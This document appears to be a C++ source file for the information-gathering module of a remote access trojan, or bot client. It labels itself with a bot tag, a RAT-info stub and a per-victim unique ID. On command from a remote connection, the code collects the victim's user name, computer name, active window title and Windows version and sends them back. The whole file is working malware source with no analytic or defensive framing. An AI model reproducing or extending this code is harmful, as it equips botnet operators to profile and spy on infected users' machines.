#include <Windows.h>
#include <Sddl.h>
#include "info.h"
#include "Utilities.h"

#define MAX_INFO_BUFFER_SIZE 300

#define INFO_BASIC				0
#define INFO_CURRENT_WINDOW		1
#define INFO_WINDOW_VERSION		2
#define INFO_BOTTAG				3
#define INFO_UID				4 //Unique ID

Info::Info(Connection* Conn, config* m_conf)
{
	ConnObj = Conn;
	conf = m_conf;
}

Info::~Info() {}

void Info::OnInit()
{
	objID = 0;
	UID = GetUID();
}

void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
{
	BYTE* SendBackBuffer = NULL;
	size_t sizeOfSendBackBuffer = 0;
	HWND hwnd;
	int titleLength;

	switch (packetData[0])
	{
	case INFO_BASIC:
		SendBackBuffer = (BYTE*)malloc(MAX_INFO_BUFFER_SIZE);
		sizeOfSendBackBuffer = MAX_INFO_BUFFER_SIZE;
		SendBackBuffer[0] = INFO_BASIC;
		if (!GetComputerInfo(SendBackBuffer + 1, &sizeOfSendBackBuffer))
		{
			SendBackBuffer[1] = 0;
			sizeOfSendBackBuffer = 2;
		}
		else
			sizeOfSendBackBuffer++;
		break;
	case INFO_CURRENT_WINDOW:
		hwnd = GetForegroundWindow();
		SendBackBuffer = (BYTE*)malloc(513);
		SendBackBuffer[0] = INFO_CURRENT_WINDOW;
		titleLength = GetWindowText(hwnd, (WCHAR*)(SendBackBuffer + 1), 512);
		sizeOfSendBackBuffer = (titleLength * 2) + 1 + 2;
		break;
	case INFO_WINDOW_VERSION:
	{
		HKEY hKey;
		LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey);
		if (lResult == ERROR_SUCCESS)
		{
			wchar_t value[256];
			DWORD valueLength = sizeof(value);
			DWORD keyType = REG_SZ;
			if (RegQueryValueEx(hKey, L"ProductName",  NULL, &keyType, (BYTE*)&value, &valueLength) == ERROR_SUCCESS)
			{
				sizeOfSendBackBuffer = 1 + valueLength;
				SendBackBuffer = (BYTE*)malloc(sizeOfSendBackBuffer);
				SendBackBuffer[0] = INFO_WINDOW_VERSION;
				wcsncpy((WCHAR*)(SendBackBuffer + 1), value, valueLength / 2);
				RegCloseKey(hKey);
				break;
			}
			RegCloseKey(hKey);
		}
		//In case failed to read registry
		sizeOfSendBackBuffer = 5 + sizeof(L"Unknown Window Version");
		SendBackBuffer = (BYTE*)malloc(sizeOfSendBackBuffer);
		ZeroMemory(SendBackBuffer, sizeOfSendBackBuffer);
		SendBackBuffer[0] = INFO_WINDOW_VERSION;
		wcsncpy((WCHAR*)(SendBackBuffer + 1), L"Unknown Window Version", sizeof(L"Unknown Window Version") / 2);
		break;
	}
	case INFO_BOTTAG:
		SendBackBuffer = (BYTE*)malloc(50);
		SendBackBuffer[0] = INFO_BOTTAG;
		wcsncpy((WCHAR*)(SendBackBuffer + 1), conf->ClientTag, sizeof(conf->ClientTag)/2);
		sizeOfSendBackBuffer = (wcslen(conf->ClientTag) * 2) + 3;//ID and null wchar
		break;
	case INFO_UID:
		SendBackBuffer = (BYTE*)malloc(5);
		SendBackBuffer[0] = INFO_UID;
		*(DWORD*)(SendBackBuffer + 1) = this->UID;
		sizeOfSendBackBuffer = 5;
		break;
	}
	SendPacket(SendBackBuffer, sizeOfSendBackBuffer);
	if (SendBackBuffer)
		free(SendBackBuffer);
}

void Info::OnExit()
{
	return;
}

bool Info::GetComputerInfo(BYTE* dataBuffer, size_t* dataMaxSize)
{
	WCHAR* SendBackBuffer = (WCHAR*)dataBuffer;
	DWORD lengthOfUserName = *dataMaxSize;
	size_t currentLength = 0;

	if (!GetUserName(SendBackBuffer, &lengthOfUserName))
		return false;
	lengthOfUserName--;
	SendBackBuffer[lengthOfUserName] = '/';
	currentLength += lengthOfUserName + 1;
	DWORD lengthOfCompName = *dataMaxSize - lengthOfUserName - 1;
	if (!GetComputerName(&SendBackBuffer[lengthOfUserName + 1], &lengthOfCompName))
		return false;
	currentLength += lengthOfCompName;

	//Because of Unicode so size = length * 2
	//Append null char at the end
	*dataMaxSize = (currentLength + 1) * 2;

	return true;
}

bool Info::GetRATInfo(BYTE* dataBuffer, size_t* dataMaxSize)
{
	return false;
}

DWORD Info::GetUID()
{
	DWORD pid = GetCurrentProcessId();
	FILETIME fileTime;
	GetSystemTimeAsFileTime(&fileTime);
	pid = pid ^ fileTime.dwLowDateTime ^ fileTime.dwHighDateTime;

	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return pid;

	PTOKEN_USER ptu = NULL;
	DWORD dwSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && ERROR_INSUFFICIENT_BUFFER != GetLastError())
		return pid;

	DWORD sidHash = 0;

	if (NULL != (ptu = (PTOKEN_USER)LocalAlloc(LPTR, dwSize)))
	{
		LPSTR StringSid = NULL;
		if (!GetTokenInformation(hToken, TokenUser, ptu, dwSize, &dwSize))
		{
			LocalFree((HLOCAL)ptu);
			return pid;
		}
		if (ConvertSidToStringSidA(ptu->User.Sid, &StringSid))
		{
			sidHash = Utilities::DJBHash(StringSid);
			LocalFree((HLOCAL)StringSid);
			LocalFree((HLOCAL)ptu);
			return (pid ^ sidHash);
		}
		LocalFree((HLOCAL)ptu);
	}
	return pid;
}